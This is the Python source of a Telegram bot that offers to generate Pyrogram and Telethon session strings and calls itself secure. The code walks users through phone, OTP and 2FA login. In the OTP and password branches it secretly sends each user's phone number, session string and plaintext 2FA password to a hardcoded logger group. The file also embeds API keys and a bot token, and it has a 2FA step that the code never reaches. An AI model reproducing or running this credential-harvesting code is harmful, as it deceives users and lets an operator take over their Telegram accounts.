from telethon import TelegramClient, events, Button
from pyrogram import Client as PyroClient
from telethon.sessions import StringSession
import time
from telethon.errors import PhoneCodeExpiredError

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
LOGGER_GROUP_ID = "-1002477750706"
# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# ✅ /start Command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "**👋 Welcome to Session Generator Bot!**\n\n"
        "🔹 **Generate Telegram Session Strings for Pyrogram & Telethon**\n"
        "🔹 **Secure and Easy to Use**\n\n"
        "**📌 Select an option below to continue:**",
        buttons=[
            [Button.inline("🎭 Generate Pyrogram Session", b"generate_pyro")],
            [Button.inline("🎭 Generate Telethon Session", b"generate_telethon")]
        ]
    )

# ✅ Generate Pyrogram Session
@bot.on(events.CallbackQuery(pattern=b"generate_pyro"))
async def ask_phone_pyro(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_pyro"}
    await event.respond("📱 **Enter your phone number with country code (e.g., +919876543210)**")

# ✅ Generate Telethon Session
@bot.on(events.CallbackQuery(pattern=b"generate_telethon"))
async def ask_phone_telethon(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone_telethon"}
    await event.respond("📱 **Enter your phone number with country code (e.g., +919876543210)**")

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone_pyro" or step == "phone_telethon":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        if step == "phone_pyro":
            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
            await client.connect()
            sent_code = await client.send_code(phone_number)
        else:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code_request(phone_number)

        user_sessions[user_id]["client"] = client  
        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
        user_sessions[user_id]["step"] = "otp"
        await event.respond("🔹 **OTP Sent! Enter the OTP received on Telegram.**")

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id]["phone_code_hash"]

        retries = 3  # Max retries for OTP
        for attempt in range(retries):
            try:
                if isinstance(client, PyroClient):
                    await client.sign_in(phone_number, phone_code_hash, otp_code)
                    session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
                else:
                    await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
                    session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!

                await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session Generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")

                await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
                del user_sessions[user_id]
                break  # Exit after successful OTP verification

            except PhoneCodeExpiredError:
                if attempt < retries - 1:
                    await event.respond(f"❌ **Error:** The confirmation code has expired. Trying again... ({attempt + 1}/{retries})")
                    # Resend code logic (add retry mechanism)
                    sent_code = await client.send_code(phone_number)
                    user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Update phone_code_hash
                    await event.respond("🔹 **New OTP sent. Please enter the code again.**")
                    time.sleep(3)  # Reduced retry delay (3 seconds)
                else:
                    await event.respond("❌ **Error:** The OTP expired multiple times. Please try again later.")
                    del user_sessions[user_id]  # Remove session if failed after retries

            except Exception as e:
                await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")
                del user_sessions[user_id]

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            if isinstance(client, PyroClient):
                await client.check_password(password)
                session_string = await client.export_session_string()  # 🔥 FIXED: Await किया गया!
            else:
                await client.sign_in(password=password)
                session_string = client.session.save()  # 🔥 FIXED: Telethon के लिए सही method!

            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (with 2FA)!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")

            await event.respond(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}\n🔄 Please try again!")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
